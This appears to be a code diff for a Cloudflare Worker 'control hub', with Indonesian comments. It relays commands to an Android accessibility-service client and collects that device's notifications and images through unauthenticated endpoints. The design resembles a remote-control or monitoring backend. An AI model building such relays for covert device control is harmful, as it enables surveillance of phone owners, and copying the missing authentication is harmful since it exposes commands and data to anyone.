@@ -1,84 +1,103 @@
+// ==============================
+// Cloudflare Worker - Control Hub
+// ==============================
+
+let lastCommand = "";           // command terakhir
+let incomingQueue = [];        // data dari website / panel
+let notifications = [];        // notif dari device
+
 export default {
-  async fetch(request, env, ctx) {
+  async fetch(request, env) {
     const url = new URL(request.url);
+    const path = url.pathname;
 
-    // ===============================
-    // SSE CLIENTS
-    // ===============================
-    if (!globalThis.clients) {
-      globalThis.clients = new Set();
-    }
-
-    // ===============================
-    // /events  → dipakai Android
-    // ===============================
-    if (url.pathname === "/events") {
-      const stream = new ReadableStream({
-        start(controller) {
-          const encoder = new TextEncoder();
-
-          const send = (msg) => {
-            controller.enqueue(
-              encoder.encode(`data: ${msg}\n\n`)
-            );
-          };
-
-          const client = { send };
-          globalThis.clients.add(client);
-
-          // kirim ping awal
-          send("CONNECTED");
-
-          request.signal.addEventListener("abort", () => {
-            globalThis.clients.delete(client);
-          });
-        }
-      });
-
-      return new Response(stream, {
-        headers: {
-          "Content-Type": "text/event-stream",
-          "Cache-Control": "no-cache",
-          "Connection": "keep-alive",
-          "Access-Control-Allow-Origin": "*"
-        }
-      });
-    }
-
-    // ===============================
-    // /send?cmd=XXXX
-    // ===============================
-    if (url.pathname === "/send") {
-      const cmd = url.searchParams.get("cmd");
-
-      if (!cmd) {
-        return new Response("NO_CMD", { status: 400 });
+    // ======================
+    // SEND COMMAND (Android UI / Web)
+    // ======================
+    if (path === "/send") {
+      const cmd = url.searchParams.get("cmd") || "";
+      if (cmd) {
+        lastCommand = cmd;
+        incomingQueue.push({
+          type: "CMD",
+          value: cmd,
+          time: Date.now()
+        });
       }
+      return text("OK");
+    }
 
-      const decoded = decodeURIComponent(cmd);
+    // ======================
+    // POLL COMMAND (Android Accessibility)
+    // ======================
+    if (path === "/poll") {
+      const cmd = lastCommand;
+      lastCommand = ""; // auto clear setelah dibaca
+      return text(cmd);
+    }
 
-      // broadcast ke semua client SSE
-      if (globalThis.clients) {
-        for (const c of globalThis.clients) {
-          try {
-            c.send(decoded);
-          } catch (_) {}
-        }
-      }
+    // ======================
+    // INCOMING DATA (Website → Android)
+    // ======================
+    if (path === "/incoming") {
+      const data = [...incomingQueue];
+      incomingQueue = []; // clear queue setelah diambil
 
-      return new Response("OK", {
-        headers: {
-          "Access-Control-Allow-Origin": "*"
-        }
+      return json({
+        data
       });
     }
 
-    // ===============================
-    // ROOT
-    // ===============================
-    return new Response(
-      "Cloudflare Worker Online 🚀",
-      { headers: { "Access-Control-Allow-Origin": "*" } }
-    );
+    // ======================
+    // DEVICE NOTIFICATION
+    // ======================
+    if (path === "/notify" && request.method === "POST") {
+      const body = await request.text();
+      notifications.push({
+        text: body,
+        time: Date.now()
+      });
+
+      // optional: limit memory
+      if (notifications.length > 100) notifications.shift();
+
+      return text("RECEIVED");
+    }
+
+    // ======================
+    // IMAGE UPLOAD (ANDROID)
+    // ======================
+    if (path === "/send_image" && request.method === "POST") {
+      // image diterima, tidak disimpan (stateless worker)
+      return text("IMAGE_OK");
+    }
+
+    // ======================
+    // MONITOR PANEL (OPTIONAL)
+    // ======================
+    if (path === "/status") {
+      return json({
+        lastCommand,
+        queueSize: incomingQueue.length,
+        notifications: notifications.slice(-5)
+      });
+    }
+
+    return text("Worker Online");
   }
 };
+
+// ======================
+// Helpers
+// ======================
+function text(t) {
+  return new Response(t, {
+    headers: { "Content-Type": "text/plain" }
+  });
+}
+
+function json(obj) {
+  return new Response(JSON.stringify(obj, null, 2), {
+    headers: { "Content-Type": "application/json" }
+  });
+}
